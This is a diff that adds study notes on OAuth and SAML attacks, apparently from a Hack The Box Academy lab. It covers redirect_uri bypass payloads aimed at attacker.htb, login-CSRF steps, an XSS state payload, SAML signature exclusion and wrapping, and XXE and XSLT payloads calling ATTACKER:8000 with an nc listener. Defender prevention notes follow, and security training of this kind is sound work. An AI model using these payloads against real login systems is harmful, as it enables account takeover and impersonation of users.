@@ -154,4 +154,109 @@ Method:
      -> response Set-Cookie: access_token=<victim JWT>.
   6. Impersonate: send that access_token cookie to the client (academy.htb) -> logged in as the victim.
 Fix = auth server must enforce an exact-match allowlist of redirect_uri values per client.
+Lab exfil: attacker.htb logs all params/headers of any request; read them at /log (curl http://attacker.htb/log).
+
+== Attack: Bypassing flawed redirect_uri validation ==
+When redirect_uri IS validated (whitelist) you get "Invalid redirect URI" (401). If the check is naive
+(startswith / contains "http://academy.htb"), bypass it. First learn the expected value by running the flow yourself.
+Payloads (redirect_uri) abusing URL structure:
+  http://academy.htb.attacker.htb/callback     # subdomain trick
+  http://academy.htb@attacker.htb/callback      # basic-auth userinfo (real host = attacker.htb)
+  http://attacker.htb/callback?a=http://academy.htb   # query param
+  http://attacker.htb/callback#http://academy.htb     # fragment
+Once one passes (200), run the token-stealing attack as above.
+
+== Attack: Missing/weak state -> Login-CSRF ==
+state = anti-CSRF token (optional but recommended). If missing or predictable -> log the VICTIM into the ATTACKER's account.
+Impact: victim adds data (payment info, etc.) to attacker's account thinking it's theirs -> attacker harvests it.
+Method:
+  1. Attacker authenticates as THEMSELVES to get an authorization code tied to their account:
+       POST /authorization/signin  username=attacker&password=attacker&client_id=..&redirect_uri=%2Fclient%2Fcallback
+  2. Grab the code from the 303 redirect.
+  3. Build the callback URL as the CSRF payload:  http://hubgit.htb/client/callback?code=<ATTACKER_CODE>
+  4. Deliver to victim (phish). Victim's browser completes the flow -> victim now logged into attacker's account.
+How state stops it: value is stored in victim's cookie; attacker's chosen state won't match -> "Invalid state" -> aborted.
+=> Only works if state is missing OR predictable (must be unpredictable, like a CSRF token).
+
+== Additional OAuth vulns (chaining) ==
+Reflected XSS on the authorization request:
+  client_id / redirect_uri / state are reflected as hidden form fields in the auth page.
+  Unsanitized -> inject e.g. state=</...><script>alert(1)</script>. XSS on the AUTH SERVER = potential full account takeover.
+
+Open redirect chaining (bypasses a CORRECT origin whitelist):
+  If auth server whitelists origin http://academy.htb/ but the client has an open redirect (/redirect?url=..),
+  point redirect_uri at it:  http://academy.htb/redirect?u=http://attacker.htb/callback
+  Passes validation, then bounces the code to attacker.htb. Continue as in Stealing Access Tokens.
+
+Malicious client (token reuse across clients):
+  Attacker registers their own OAuth client evil.htb. Victim logs into evil.htb -> attacker gets victim's access_token.
+  If academy.htb doesn't check the token was issued FOR ITSELF -> replay token there to impersonate the victim.
+
+== OAuth Prevention (defender notes) ==
+- Strictly follow the OAuth spec across ALL entities (client + auth + resource server).
+- Enforce state (auth server) + implement it (client), even though spec makes it optional. Keep it unpredictable.
+- Prefer authorization code grant over implicit.
+- Auth server: strictly validate redirect_uri against trusted exact origins; reject anything else.
+- Bind/verify access tokens to the client they were issued for (blocks malicious-client reuse).
+- Store tokens securely, transmit over HTTPS only. Sanitize reflected params (anti-XSS). Add MFA. Regular audits/pentest/code review.
+
+
+########################################  SAML  ########################################
+
+== SAML recap ==
+Actors: Principal (user) | Service Provider (SP, the app, academy.htb) | Identity Provider (IdP, sso.htb).
+Flow: user hits SP -> redirected to IdP -> authenticates -> IdP returns a signed SAML Response (XML) to the SP's
+ACS endpoint (/acs.php) via a POST param SAMLResponse. SP verifies the signature, then reads identity from the
+<saml:Assertion> (name, email, id...) to log the user in.
+Wire format: SAMLResponse is base64 THEN url-encoded. To edit -> url-decode -> base64-decode -> edit XML -> base64 -> url-encode.
+The signature (ds:Signature) is what protects the assertion from tampering. All attacks = defeat / sidestep that signature.
+
+== Attack: Signature Exclusion ==
+Idea: some SPs only verify the signature IF one is present, and accept the response if it's absent.
+Method:
+  1. Decode the SAMLResponse to XML.
+  2. Change the target attribute, e.g. <AttributeValue>htb-stdnt</> -> admin.
+  3. Remove ALL <ds:Signature> nodes (there can be several: on the Response and/or the Assertion).
+  4. Re-encode (base64 -> url-encode) and send.
+If accepted -> SP skipped verification when no signature was found. (Just editing WITHOUT removing sig = "Invalid SAML Response".)
+
+== Attack: Signature Wrapping (XSW) ==
+Idea: create a mismatch between (a) what the signature-verification logic checks and (b) what the app logic reads.
+Precondition: verifier finds the signed element via ds:Reference URI and validates it, but does NO extra checks
+(e.g. doesn't count assertions); app logic reads identity from the FIRST assertion it finds.
+Signature can protect the whole Response or just the Assertion; located as enveloped (inside signed elem) /
+enveloping (wraps it) / detached (sibling). The ds:Reference URI="#<ID>" points at the signed element's ID.
+Method (enveloped sig protecting the Assertion):
+  1. Decode to XML, copy the original signed <saml:Assertion>.
+  2. Make a forged copy: change its ID (e.g. _evilID) and its attributes (id=1, name=admin, email=admin@...); strip its signature.
+  3. Inject the forged assertion BEFORE the original signed assertion inside <samlp:Response>.
+     -> Response now has 2 assertions; the original (still signed & untouched) keeps the signature valid.
+  4. Re-encode and send. Verifier validates the still-present signed assertion; app reads the FIRST (forged) one -> auth as admin.
+
+== Attack: XXE via SAML ==
+SAML is XML -> a misconfigured parser loading external entities is XXE-able.
+Method: prepend a DOCTYPE with an external entity to the SAML XML, aim it at your host (blind = OOB confirm).
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://ATTACKER:8000"> %xxe; ]>
+  <samlp:Response> ... </samlp:Response>
+Re-encode, send, watch:  nc -lnvp 8000  -> inbound GET = vulnerable. Blind, so exfil is harder. (see Web Attacks module.)
+
+== Attack: XSLT Server-Side Injection via SAML ==
+If the parser processes XSLT, inject a stylesheet that fetches your server.
+  <?xml version="1.0" encoding="utf-8"?>
+  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+    <xsl:template match="/"><xsl:copy-of select="document('http://ATTACKER:8000/')"/></xsl:template>
+  </xsl:stylesheet>
+Re-encode, send, watch with nc. Inbound connection = vulnerable (even if the response itself is rejected as "Invalid").
+If a bare payload fails, inject it into a <ds:Transform> node of a VALID SAML response (triggers only during valid parsing).
+
+== Tooling: SAML Raider (Burp extension) ==
+Install: Burp > Extensions > BApp Store > SAML Raider. Auto-highlights SAML requests.
+In Repeater -> SAML Raider tab: "SAML Message Info" (decoded XML + issuer/sig/digest algos),
+"SAML Attacks" tab -> one-click: Remove Signatures (sig exclusion), XXE, XSLT, all 8 XSW variants.
+It re-encodes for you -> just resend in Repeater. No manual decode/encode.
+
+== SAML Prevention (defender notes) ==
+- Use an established, up-to-date SAML library (handles sig verification + assertion extraction correctly).
+- Modern libs are patched against exclusion / wrapping / XXE / XSLT. See OWASP SAML Security Cheat Sheet.
 
